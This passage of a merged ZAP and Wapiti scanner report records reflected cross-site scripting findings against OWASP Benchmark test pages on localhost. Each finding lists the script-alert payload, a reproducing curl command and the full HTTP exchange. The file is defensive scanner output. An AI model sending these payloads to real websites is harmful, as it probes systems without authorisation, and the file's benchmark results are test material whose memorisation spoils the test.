                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01349?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01349=%3CScRiPt%3Ealert%28%27wygfz7ctxe%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wygfz7ctxe')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wygfz7ctxe')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01349\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01349.html?BenchmarkTest01349=SafeText\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01349=%3CScRiPt%3Ealert%28%27wygfz7ctxe%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01349"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01349', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01349.html?BenchmarkTest01349=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDEzNDk9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01349', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01349.html?BenchmarkTest01349=SafeText', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01349=%3CScRiPt%3Ealert%28%27wygfz7ctxe%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '37', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:57 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>_SafeStuff\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '47', 'date': 'Sun, 31 Aug 2025 04:24:55 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wygfz7ctxe')</sCrIpT>_SafeStuff\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01350",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01350?secure=default&productID=default&foo=foo&BenchmarkTest01350=%3CScRiPt%3Ealert%28%27wzfuru1jm4%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wzfuru1jm4')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wzfuru1jm4')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01350\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01350.html?BenchmarkTest01350=SafeText\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest01350=%3CScRiPt%3Ealert%28%27wzfuru1jm4%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01350"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01350', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01350.html?BenchmarkTest01350=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAxMzUwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01350', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01350.html?BenchmarkTest01350=SafeText', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest01350=%3CScRiPt%3Ealert%28%27wzfuru1jm4%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:57 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:24:55 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wzfuru1jm4')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01505",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01505?BenchmarkTest01505=%3CScRiPt%3Ealert%28%27wj2e76qi1j%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 4",
                    "Wapiti - 4"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                      "Wapiti - <ScRiPt>alert('wj2e76qi1j')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - </p><scrIpt>alert(1);</scRipt><p>",
                  "Wapiti - <ScRiPt>alert('wj2e76qi1j')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01505\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01505.html\" -d \"BenchmarkTest01505=%3CScRiPt%3Ealert%28%27wj2e76qi1j%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01505"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01505', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '78', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01505.html?BenchmarkTest01505=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAxNTA1PSUzQyUyRnAlM0UlM0NzY3JJcHQlM0VhbGVydCUyODElMjklM0IlM0MlMkZzY1JpcHQlM0UlM0NwJTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01505', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01505.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest01505=%3CScRiPt%3Ealert%28%27wj2e76qi1j%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '110', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:58 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and </p><scrIpt>alert(1);</scRipt><p>.\\n</p>\\n</body>\\n</html>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '113', 'date': 'Sun, 31 Aug 2025 04:25:08 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<!DOCTYPE html>\\n<html>\\n<body>\\n<p>Formatted like: a and <ScRiPt>alert('wj2e76qi1j')</sCrIpT>.\\n</p>\\n</body>\\n</html>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-02/BenchmarkTest01507",
                    "Wapiti - https://localhost:8444/benchmark/xss-02/BenchmarkTest01507?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01507=%3CScRiPt%3Ealert%28%27wamdgakisf%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wamdgakisf')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wamdgakisf')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01507\" -e \"https://localhost:8444/benchmark/xss-02/BenchmarkTest01507.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01507=%3CScRiPt%3Ealert%28%27wamdgakisf%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01507"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01507', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '102', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01507.html?BenchmarkTest01507=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'ZW1haWw9emFwcm94eSU0MGV4YW1wbGUuY29tJnBhc3N3b3JkPVpBUCZCZW5jaG1hcmtUZXN0MDE1MDc9JTNDc2NySXB0JTNFYWxlcnQlMjgxJTI5JTNCJTNDJTJGc2NSaXB0JTNF'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01507', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-02/BenchmarkTest01507.html', 'content-length': '125', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest01507=%3CScRiPt%3Ealert%28%27wamdgakisf%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:24:58 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:25:08 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wamdgakisf')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-03/BenchmarkTest01509",
                    "Wapiti - https://localhost:8444/benchmark/xss-03/BenchmarkTest01509?BenchmarkTest01509=SafeText&BenchmarkTest01509=Movies&BenchmarkTest01509=Writing&BenchmarkTest01509=%3CScRiPt%3Ealert%28%27wd1y4byt2b%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wd1y4byt2b')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wd1y4byt2b')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01509\" -e \"https://localhost:8444/benchmark/xss-03/BenchmarkTest01509.html?BenchmarkTest01509=SafeText\" -d \"BenchmarkTest01509=SafeText&BenchmarkTest01509=Movies&BenchmarkTest01509=Writing&BenchmarkTest01509=%3CScRiPt%3Ealert%28%27wd1y4byt2b%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest01509"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
